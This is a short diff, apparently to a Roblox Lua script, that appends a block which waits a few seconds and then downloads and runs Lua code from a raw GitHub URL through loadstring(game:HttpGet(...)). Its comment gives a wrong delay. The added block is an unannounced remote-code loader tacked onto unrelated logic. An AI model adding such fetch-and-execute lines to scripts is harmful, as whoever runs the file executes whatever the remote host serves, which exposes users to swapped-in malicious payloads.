@@ -356,3 +356,8 @@ end
 dropIfFull()
 hiding = false
 unhideAllVisuals()
+
+task.spawn(function()
+    task.wait(10) -- Wait for 120 seconds before executing
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/fly.github.io/refs/heads/main/fly.lua"))()
+end)
